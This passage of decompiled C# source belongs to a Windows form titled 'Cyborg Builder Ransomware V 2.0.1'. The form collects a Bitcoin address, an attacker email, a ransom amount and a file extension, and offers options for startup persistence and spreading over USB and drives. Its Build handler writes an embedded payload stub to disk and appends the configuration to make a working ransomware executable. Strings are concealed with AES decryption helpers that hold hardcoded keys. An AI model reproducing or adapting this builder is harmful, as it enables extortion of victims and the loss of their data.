		TextBox textBox2 = TextBox5;
		size = new Size(151, 82);
		((Control)textBox2).set_Size(size);
		((Control)TextBox5).set_TabIndex(52);
		TextBox5.set_Text(componentResourceManager.GetString("TextBox5.Text"));
		((ButtonBase)RadioButton11).set_AutoSize(true);
		((ButtonBase)RadioButton11).set_FlatStyle((FlatStyle)0);
		((Control)RadioButton11).set_ForeColor(Color.Blue);
		RadioButton radioButton = RadioButton11;
		location = new Point(0, 0);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton11).set_Name("RadioButton11");
		RadioButton radioButton2 = RadioButton11;
		size = new Size(49, 20);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton11).set_TabIndex(53);
		RadioButton11.set_TabStop(true);
		((ButtonBase)RadioButton11).set_Text("Blue");
		((ButtonBase)RadioButton11).set_UseVisualStyleBackColor(true);
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Trebuchet MS", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.White);
		Label3.set_ImeMode((ImeMode)0);
		Label label3 = Label3;
		location = new Point(16, 161);
		((Control)label3).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label4 = Label3;
		size = new Size(137, 18);
		((Control)label4).set_Size(size);
		((Control)Label3).set_TabIndex(50);
		Label3.set_Text("Wallaper Ransomware");
		((Control)BlackShadesNetButton1).set_BackColor(Color.FromArgb(38, 38, 38));
		((Control)BlackShadesNetButton1).set_Font(new Font("Trebuchet MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)BlackShadesNetButton1).set_ForeColor(Color.DodgerBlue);
		BlackShadesNetButton blackShadesNetButton = BlackShadesNetButton1;
		location = new Point(391, 224);
		((Control)blackShadesNetButton).set_Location(location);
		((Control)BlackShadesNetButton1).set_Name("BlackShadesNetButton1");
		BlackShadesNetButton blackShadesNetButton2 = BlackShadesNetButton1;
		size = new Size(80, 46);
		((Control)blackShadesNetButton2).set_Size(size);
		((Control)BlackShadesNetButton1).set_TabIndex(49);
		((Control)BlackShadesNetButton1).set_Text("Build");
		BlackShadesNetButton1.TextAlignment = (StringAlignment)1;
		((ButtonBase)CheckBox1).set_AutoSize(true);
		((ButtonBase)CheckBox1).set_FlatStyle((FlatStyle)1);
		((Control)CheckBox1).set_ForeColor(Color.DodgerBlue);
		CheckBox checkBox = CheckBox1;
		location = new Point(420, 250);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(13, 12);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(35);
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		((Control)Panel5).get_Controls().Add((Control)(object)Label9);
		((Control)Panel5).get_Controls().Add((Control)(object)CheckBox2);
		((Control)Panel5).get_Controls().Add((Control)(object)Label4);
		((Control)Panel5).get_Controls().Add((Control)(object)CheckBox5);
		((Control)Panel5).get_Controls().Add((Control)(object)CheckBox6);
		((Control)Panel5).get_Controls().Add((Control)(object)CheckBox4);
		((Control)Panel5).get_Controls().Add((Control)(object)CheckBox3);
		Panel panel7 = Panel5;
		location = new Point(383, 13);
		((Control)panel7).set_Location(location);
		((Control)Panel5).set_Name("Panel5");
		Panel panel8 = Panel5;
		size = new Size(106, 189);
		((Control)panel8).set_Size(size);
		((Control)Panel5).set_TabIndex(46);
		Label9.set_AutoSize(true);
		((Control)Label9).set_ForeColor(Color.Red);
		Label9.set_ImeMode((ImeMode)0);
		Label label5 = Label9;
		location = new Point(30, 169);
		((Control)label5).set_Location(location);
		((Control)Label9).set_Name("Label9");
		Label label6 = Label9;
		size = new Size(41, 16);
		((Control)label6).set_Size(size);
		((Control)Label9).set_TabIndex(53);
		Label9.set_Text("About");
		((ButtonBase)CheckBox2).set_AutoSize(true);
		((ButtonBase)CheckBox2).set_FlatStyle((FlatStyle)1);
		((Control)CheckBox2).set_Font(new Font("Trebuchet MS", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)CheckBox2).set_ForeColor(Color.DodgerBlue);
		CheckBox checkBox3 = CheckBox2;
		location = new Point(8, 39);
		((Control)checkBox3).set_Location(location);
		((Control)CheckBox2).set_Name("CheckBox2");
		CheckBox checkBox4 = CheckBox2;
		size = new Size(85, 20);
		((Control)checkBox4).set_Size(size);
		((Control)CheckBox2).set_TabIndex(78);
		((ButtonBase)CheckBox2).set_Text("Spech Voice");
		((ButtonBase)CheckBox2).set_UseVisualStyleBackColor(true);
		Label4.set_AutoSize(true);
		((Control)Label4).set_Font(new Font("Trebuchet MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.AliceBlue);
		Label4.set_ImeMode((ImeMode)0);
		Label label7 = Label4;
		location = new Point(18, 13);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(55, 18);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(48);
		Label4.set_Text("Options");
		((ButtonBase)CheckBox5).set_AutoSize(true);
		((ButtonBase)CheckBox5).set_FlatStyle((FlatStyle)1);
		((Control)CheckBox5).set_Font(new Font("Trebuchet MS", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)CheckBox5).set_ForeColor(Color.DodgerBlue);
		CheckBox checkBox5 = CheckBox5;
		location = new Point(8, 112);
		((Control)checkBox5).set_Location(location);
		((Control)CheckBox5).set_Name("CheckBox5");
		CheckBox checkBox6 = CheckBox5;
		size = new Size(80, 20);
		((Control)checkBox6).set_Size(size);
		((Control)CheckBox5).set_TabIndex(41);
		((ButtonBase)CheckBox5).set_Text("Spread Usb");
		((ButtonBase)CheckBox5).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox6).set_AutoSize(true);
		((ButtonBase)CheckBox6).set_FlatStyle((FlatStyle)1);
		((Control)CheckBox6).set_Font(new Font("Trebuchet MS", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)CheckBox6).set_ForeColor(Color.DodgerBlue);
		CheckBox checkBox7 = CheckBox6;
		location = new Point(8, 138);
		((Control)checkBox7).set_Location(location);
		((Control)CheckBox6).set_Name("CheckBox6");
		CheckBox checkBox8 = CheckBox6;
		size = new Size(69, 20);
		((Control)checkBox8).set_Size(size);
		((Control)CheckBox6).set_TabIndex(47);
		((ButtonBase)CheckBox6).set_Text("shortcut");
		((ButtonBase)CheckBox6).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox4).set_AutoSize(true);
		((ButtonBase)CheckBox4).set_FlatStyle((FlatStyle)1);
		((Control)CheckBox4).set_Font(new Font("Trebuchet MS", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)CheckBox4).set_ForeColor(Color.DodgerBlue);
		CheckBox checkBox9 = CheckBox4;
		location = new Point(8, 86);
		((Control)checkBox9).set_Location(location);
		((Control)CheckBox4).set_Name("CheckBox4");
		CheckBox checkBox10 = CheckBox4;
		size = new Size(94, 20);
		((Control)checkBox10).set_Size(size);
		((Control)CheckBox4).set_TabIndex(38);
		((ButtonBase)CheckBox4).set_Text("Spread Drives");
		((ButtonBase)CheckBox4).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox3).set_AutoSize(true);
		((ButtonBase)CheckBox3).set_FlatStyle((FlatStyle)1);
		((Control)CheckBox3).set_Font(new Font("Trebuchet MS", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)CheckBox3).set_ForeColor(Color.DodgerBlue);
		CheckBox checkBox11 = CheckBox3;
		location = new Point(8, 62);
		((Control)checkBox11).set_Location(location);
		((Control)CheckBox3).set_Name("CheckBox3");
		CheckBox checkBox12 = CheckBox3;
		size = new Size(63, 20);
		((Control)checkBox12).set_Size(size);
		((Control)CheckBox3).set_TabIndex(37);
		((ButtonBase)CheckBox3).set_Text("startup");
		((ButtonBase)CheckBox3).set_UseVisualStyleBackColor(true);
		((Control)Panel4).get_Controls().Add((Control)(object)TextBox8);
		((Control)Panel4).get_Controls().Add((Control)(object)Label5);
		((Control)Panel4).get_Controls().Add((Control)(object)TextBox3);
		((Control)Panel4).get_Controls().Add((Control)(object)Textbox6);
		((Control)Panel4).get_Controls().Add((Control)(object)Label6);
		((Control)Panel4).get_Controls().Add((Control)(object)TextBox2);
		((Control)Panel4).get_Controls().Add((Control)(object)TextBox1);
		((Control)Panel4).get_Controls().Add((Control)(object)Label1);
		((Control)Panel4).get_Controls().Add((Control)(object)Label8);
		((Control)Panel4).get_Controls().Add((Control)(object)Label7);
		Panel panel9 = Panel4;
		location = new Point(13, 13);
		((Control)panel9).set_Location(location);
		((Control)Panel4).set_Name("Panel4");
		Panel panel10 = Panel4;
		size = new Size(364, 137);
		((Control)panel10).set_Size(size);
		((Control)Panel4).set_TabIndex(45);
		((TextBoxBase)TextBox8).set_BackColor(Color.Black);
		((TextBoxBase)TextBox8).set_BorderStyle((BorderStyle)0);
		((TextBoxBase)TextBox8).set_ForeColor(Color.DodgerBlue);
		TextBox textBox3 = TextBox8;
		location = new Point(170, 114);
		((Control)textBox3).set_Location(location);
		((Control)TextBox8).set_Name("TextBox8");
		TextBox textBox4 = TextBox8;
		size = new Size(171, 13);
		((Control)textBox4).set_Size(size);
		((Control)TextBox8).set_TabIndex(53);
		TextBox8.set_Text("500 $");
		Label5.set_AutoSize(true);
		((Control)Label5).set_ForeColor(Color.DodgerBlue);
		Label5.set_ImeMode((ImeMode)0);
		Label label9 = Label5;
		location = new Point(72, 112);
		((Control)label9).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label10 = Label5;
		size = new Size(86, 16);
		((Control)label10).set_Size(size);
		((Control)Label5).set_TabIndex(52);
		Label5.set_Text("price               :");
		((TextBoxBase)TextBox3).set_BackColor(Color.Black);
		((TextBoxBase)TextBox3).set_BorderStyle((BorderStyle)0);
		((TextBoxBase)TextBox3).set_ForeColor(Color.DodgerBlue);
		TextBox textBox5 = TextBox3;
		location = new Point(170, 88);
		((Control)textBox5).set_Location(location);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox6 = TextBox3;
		size = new Size(171, 13);
		((Control)textBox6).set_Size(size);
		((Control)TextBox3).set_TabIndex(49);
		TextBox3.set_Text(".crab");
		((TextBoxBase)Textbox6).set_BackColor(Color.Black);
		((TextBoxBase)Textbox6).set_BorderStyle((BorderStyle)0);
		((TextBoxBase)Textbox6).set_ForeColor(Color.DodgerBlue);
		TextBox textbox = Textbox6;
		location = new Point(170, 39);
		((Control)textbox).set_Location(location);
		Textbox6.set_Multiline(true);
		((Control)Textbox6).set_Name("Textbox6");
		TextBox textbox2 = Textbox6;
		size = new Size(171, 16);
		((Control)textbox2).set_Size(size);
		((Control)Textbox6).set_TabIndex(36);
		Textbox6.set_Text("Exemple : crab");
		Label6.set_AutoSize(true);
		((Control)Label6).set_ForeColor(Color.DodgerBlue);
		Label6.set_ImeMode((ImeMode)0);
		Label label11 = Label6;
		location = new Point(72, 39);
		((Control)label11).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label12 = Label6;
		size = new Size(88, 16);
		((Control)label12).set_Size(size);
		((Control)Label6).set_TabIndex(38);
		Label6.set_Text("Name Ransom :");
		((TextBoxBase)TextBox2).set_BackColor(Color.Black);
		((TextBoxBase)TextBox2).set_BorderStyle((BorderStyle)0);
		((TextBoxBase)TextBox2).set_ForeColor(Color.DodgerBlue);
		TextBox textBox7 = TextBox2;
		location = new Point(170, 66);
		((Control)textBox7).set_Location(location);
		TextBox2.set_Multiline(true);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox8 = TextBox2;
		size = new Size(171, 16);
		((Control)textBox8).set_Size(size);
		((Control)TextBox2).set_TabIndex(34);
		TextBox2.set_Text("Exemple : Hacker@mail.ru");
		((TextBoxBase)TextBox1).set_BackColor(Color.Black);
		((TextBoxBase)TextBox1).set_BorderStyle((BorderStyle)0);
		((TextBoxBase)TextBox1).set_ForeColor(Color.DodgerBlue);
		TextBox textBox9 = TextBox1;
		location = new Point(170, 13);
		((Control)textBox9).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox10 = TextBox1;
		size = new Size(171, 20);
		((Control)textBox10).set_Size(size);
		((Control)TextBox1).set_TabIndex(33);
		TextBox1.set_Text("Exemple : yasghgeydwerwr");
		Label1.set_AutoSize(true);
		((Control)Label1).set_ForeColor(Color.DodgerBlue);
		Label1.set_ImeMode((ImeMode)0);
		Label label13 = Label1;
		location = new Point(72, 13);
		((Control)label13).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label14 = Label1;
		size = new Size(89, 16);
		((Control)label14).set_Size(size);
		((Control)Label1).set_TabIndex(37);
		Label1.set_Text("Your Bitcoin   :");
		Label8.set_AutoSize(true);
		((Control)Label8).set_ForeColor(Color.DodgerBlue);
		Label8.set_ImeMode((ImeMode)0);
		Label label15 = Label8;
		location = new Point(72, 88);
		((Control)label15).set_Location(location);
		((Control)Label8).set_Name("Label8");
		Label label16 = Label8;
		size = new Size(86, 16);
		((Control)label16).set_Size(size);
		((Control)Label8).set_TabIndex(40);
		Label8.set_Text("Extension       :");
		Label7.set_AutoSize(true);
		((Control)Label7).set_ForeColor(Color.DodgerBlue);
		Label7.set_ImeMode((ImeMode)0);
		Label label17 = Label7;
		location = new Point(72, 66);
		((Control)label17).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label18 = Label7;
		size = new Size(88, 16);
		((Control)label18).set_Size(size);
		((Control)Label7).set_TabIndex(39);
		Label7.set_Text("Email Hacker  :");
		((Control)Panel3).get_Controls().Add((Control)(object)RadioButton4);
		((Control)Panel3).get_Controls().Add((Control)(object)RadioButton3);
		((Control)Panel3).get_Controls().Add((Control)(object)RadioButton2);
		((Control)Panel3).get_Controls().Add((Control)(object)PictureBox2);
		Panel panel11 = Panel3;
		location = new Point(13, 182);
		((Control)panel11).set_Location(location);
		((Control)Panel3).set_Name("Panel3");
		Panel panel12 = Panel3;
		size = new Size(184, 99);
		((Control)panel12).set_Size(size);
		((Control)Panel3).set_TabIndex(43);
		((ButtonBase)RadioButton4).set_AutoSize(true);
		((ButtonBase)RadioButton4).set_FlatStyle((FlatStyle)0);
		((Control)RadioButton4).set_ForeColor(Color.Blue);
		RadioButton radioButton3 = RadioButton4;
		location = new Point(120, 16);
		((Control)radioButton3).set_Location(location);
		((Control)RadioButton4).set_Name("RadioButton4");
		RadioButton radioButton4 = RadioButton4;
		size = new Size(49, 20);
		((Control)radioButton4).set_Size(size);
		((Control)RadioButton4).set_TabIndex(77);
		RadioButton4.set_TabStop(true);
		((ButtonBase)RadioButton4).set_Text("Blue");
		((ButtonBase)RadioButton4).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton3).set_AutoSize(true);
		((ButtonBase)RadioButton3).set_FlatStyle((FlatStyle)0);
		((Control)RadioButton3).set_ForeColor(Color.Red);
		RadioButton radioButton5 = RadioButton3;
		location = new Point(120, 68);
		((Control)radioButton5).set_Location(location);
		((Control)RadioButton3).set_Name("RadioButton3");
		RadioButton radioButton6 = RadioButton3;
		size = new Size(46, 20);
		((Control)radioButton6).set_Size(size);
		((Control)RadioButton3).set_TabIndex(55);
		RadioButton3.set_TabStop(true);
		((ButtonBase)RadioButton3).set_Text("Red");
		((ButtonBase)RadioButton3).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton2).set_AutoSize(true);
		((ButtonBase)RadioButton2).set_FlatStyle((FlatStyle)0);
		((Control)RadioButton2).set_ForeColor(Color.Lime);
		RadioButton radioButton7 = RadioButton2;
		location = new Point(120, 42);
		((Control)radioButton7).set_Location(location);
		((Control)RadioButton2).set_Name("RadioButton2");
		RadioButton radioButton8 = RadioButton2;
		size = new Size(58, 20);
		((Control)radioButton8).set_Size(size);
		((Control)RadioButton2).set_TabIndex(54);
		RadioButton2.set_TabStop(true);
		((ButtonBase)RadioButton2).set_Text("Green");
		((ButtonBase)RadioButton2).set_UseVisualStyleBackColor(true);
		PictureBox2.set_BorderStyle((BorderStyle)1);
		PictureBox pictureBox3 = PictureBox2;
		location = new Point(6, 3);
		((Control)pictureBox3).set_Location(location);
		((Control)PictureBox2).set_Name("PictureBox2");
		PictureBox pictureBox4 = PictureBox2;
		size = new Size(108, 85);
		((Control)pictureBox4).set_Size(size);
		PictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox2.set_TabIndex(41);
		PictureBox2.set_TabStop(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(492, 516);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)BlackShadesNetForm1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text(" Cyborg Builder Ransomware V 2.0.1");
		((Form)this).set_TransparencyKey(Color.Fuchsia);
		((Control)BlackShadesNetForm1).ResumeLayout(false);
		((Control)Panel1).ResumeLayout(false);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel2).PerformLayout();
		((Control)Panel6).ResumeLayout(false);
		((Control)Panel6).PerformLayout();
		((Control)Panel5).ResumeLayout(false);
		((Control)Panel5).PerformLayout();
		((Control)Panel4).ResumeLayout(false);
		((Control)Panel4).PerformLayout();
		((Control)Panel3).ResumeLayout(false);
		((Control)Panel3).PerformLayout();
		((ISupportInitialize)PictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_1(Timer WithEventsValue)
	{
		EventHandler eventHandler = method_1;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = WithEventsValue;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (bool_0)
		{
			ProjectData.EndApp();
		}
		else
		{
			ProjectData.EndApp();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)PictureBox2).set_Enabled(false);
		((Control)CheckBox1).set_Enabled(false);
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.smethod_11(), (AudioPlayMode)1);
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.smethod_4(), (AudioPlayMode)1);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void BlackShadesNetButton1_Click(object sender, EventArgs e)
	{
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Expected O, but got Unknown
		//IL_03e7: Unknown result type (might be due to invalid IL or missing references)
		((Computer)Class2.Class1_0).get_Audio().Play(Class12.smethod_7(), (AudioPlayMode)1);
		string text = "";
		string text2 = "";
		string text3 = "";
		string text4 = "";
		string text5 = "";
		bool flag = false;
		bool flag2 = false;
		bool flag3 = false;
		bool flag4 = false;
		bool flag5 = false;
		bool flag6 = false;
		bool flag7 = false;
		bool flag8 = false;
		bool flag9 = false;
		bool flag10 = false;
		string text6 = "";
		PictureBox2.set_Image((Image)null);
		string text7 = "";
		string text8 = Conversions.ToString(Operators.AddObject((object)Application.get_StartupPath(), method_0("Sqxku+muJXNRmLaWbYw3Kg==")));
		SaveFileDialog val = new SaveFileDialog();
		((FileDialog)val).set_Title(Conversions.ToString(method_0("bXCxTmipJCNi2xTCm3zO9GdUdS0TbBRsH6PRg7TXLnc=")));
		((CommonDialog)val).ShowDialog();
		if (Operators.CompareString(((FileDialog)val).get_FileName(), "", false) <= 0)
		{
			return;
		}
		text = TextBox1.get_Text();
		text2 = TextBox2.get_Text();
		text3 = TextBox3.get_Text();
		text4 = TextBox5.get_Text();
		flag = CheckBox3.get_Checked();
		flag2 = CheckBox4.get_Checked();
		flag3 = CheckBox5.get_Checked();
		flag4 = CheckBox6.get_Checked();
		flag6 = CheckBox1.get_Checked();
		flag10 = CheckBox2.get_Checked();
		text6 = Textbox6.get_Text();
		text5 = TextBox8.get_Text();
		flag5 = RadioButton11.get_Checked();
		flag7 = RadioButton2.get_Checked();
		flag8 = RadioButton3.get_Checked();
		flag9 = RadioButton4.get_Checked();
		PictureBox val2 = new PictureBox();
		lock (val2)
		{
			PictureBox2.set_Image(val2.get_Image());
		}
		try
		{
			File.WriteAllBytes(text8, Class12.smethod_18());
			FileSystem.FileOpen(1, text8, (OpenMode)32, (OpenAccess)1, (OpenShare)(-1), -1);
			text7 = Strings.Space(checked((int)FileSystem.LOF(1)));
			FileSystem.FileGet(1, ref text7, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			FileSystem.FileOpen(1, Conversions.ToString(Operators.ConcatenateObject((object)((FileDialog)val).get_FileName(), method_0("fQvWlAJlwzbD7p/8X7vfWg=="))), (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
			FileSystem.FilePut(1, text7 + "|UfchLjwVVnWqUsBgWq|" + text + "|UfchLjwVVnWqUsBgWq|" + text2 + "|UfchLjwVVnWqUsBgWq|" + text3 + "|UfchLjwVVnWqUsBgWq|" + text4 + "|UfchLjwVVnWqUsBgWq|" + text6 + "|UfchLjwVVnWqUsBgWq|" + text5 + "|UfchLjwVVnWqUsBgWq|" + Conversions.ToString(flag) + "|UfchLjwVVnWqUsBgWq|" + Conversions.ToString(flag2) + "|UfchLjwVVnWqUsBgWq|" + Conversions.ToString(flag3) + "|UfchLjwVVnWqUsBgWq|" + Conversions.ToString(flag4) + "|UfchLjwVVnWqUsBgWq|" + Conversions.ToString(flag5) + "|UfchLjwVVnWqUsBgWq|" + Conversions.ToString(flag6) + "|UfchLjwVVnWqUsBgWq|" + Conversions.ToString(flag7) + "|UfchLjwVVnWqUsBgWq|" + Conversions.ToString(flag8) + "|UfchLjwVVnWqUsBgWq|" + Conversions.ToString(flag9) + "|UfchLjwVVnWqUsBgWq|" + Conversions.ToString(flag10) + "|UfchLjwVVnWqUsBgWq|", -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			FileSystem.FileClose(new int[1] { 1 });
			Interaction.MsgBox(RuntimeHelpers.GetObjectValue(method_0("g3tMWjG8TuEhkk8kFGYyTfciXZglapHIKTe/em79If8=")), (MsgBoxStyle)64, RuntimeHelpers.GetObjectValue(method_0("vQmFoP4UfyGXmUT0fwVqPs6hOAdUi99J5Q4ZIfmYXxE=")));
			if (File.Exists(Conversions.ToString(method_0("gnZaoBbT0wKbrmV8cpWARg=="))))
			{
				try
				{
					File.Delete(Conversions.ToString(method_0("gnZaoBbT0wKbrmV8cpWARg==")));
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return;
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			if (File.Exists(Conversions.ToString(method_0("gnZaoBbT0wKbrmV8cpWARg=="))))
			{
				try
				{
					File.Delete(Conversions.ToString(method_0("gnZaoBbT0wKbrmV8cpWARg==")));
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			ProjectData.ClearProjectError();
		}
	}

	private object method_0(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("acHWYGeGtRaajSMkDBWUJvI", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	private void RadioButton11_CheckedChanged(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.smethod_13(), (AudioPlayMode)1);
		if (RadioButton11.get_Checked())
		{
			Bitmap image = Class12.smethod_0();
			PictureBox2.set_Image((Image)(object)image);
		}
	}

	private void PictureBox2_Click(object sender, EventArgs e)
	{
		vmethod_0().Start();
	}

	private void method_1(object sender, EventArgs e)
	{
		checked
		{
			if (0 > Screen.get_PrimaryScreen().get_WorkingArea().Height - ((Control)this).get_Height())
			{
				int num = num - 5;
				int x = default(int);
				Point location = new Point(x, num);
				((Form)this).set_Location(location);
			}
			else
			{
				Thread.Sleep(500);
				((Form)this).Close();
			}
		}
	}

	private void method_2(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play(Class12.smethod_21(), (AudioPlayMode)1);
	}

	private void RadioButton2_CheckedChanged(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.smethod_13(), (AudioPlayMode)1);
		if (RadioButton2.get_Checked())
		{
			Bitmap image = Class12.smethod_1();
			PictureBox2.set_Image((Image)(object)image);
		}
	}

	private void RadioButton3_CheckedChanged(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.smethod_13(), (AudioPlayMode)1);
		if (RadioButton3.get_Checked())
		{
			Bitmap image = Class12.smethod_2();
			PictureBox2.set_Image((Image)(object)image);
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play(Class12.smethod_21(), (AudioPlayMode)1);
	}

	private void method_4(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play(Class12.smethod_21(), (AudioPlayMode)1);
	}

	private void method_5(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play(Class12.smethod_21(), (AudioPlayMode)1);
	}

	private void CheckBox1_CheckedChanged(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play(Class12.smethod_21(), (AudioPlayMode)1);
	}

	private void RadioButton4_CheckedChanged(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.smethod_13(), (AudioPlayMode)1);
		if (RadioButton4.get_Checked())
		{
			Bitmap image = Class12.smethod_0();
			PictureBox2.set_Image((Image)(object)image);
		}
	}

	private object method_6(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("cIcIROdRUROhWMHfuvcPYGJ", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	private void method_7(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play(Class12.smethod_21(), (AudioPlayMode)1);
	}

	private object method_8(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("cIcIROdRUROhWMHfuvcPYGJ", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	private object method_9(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
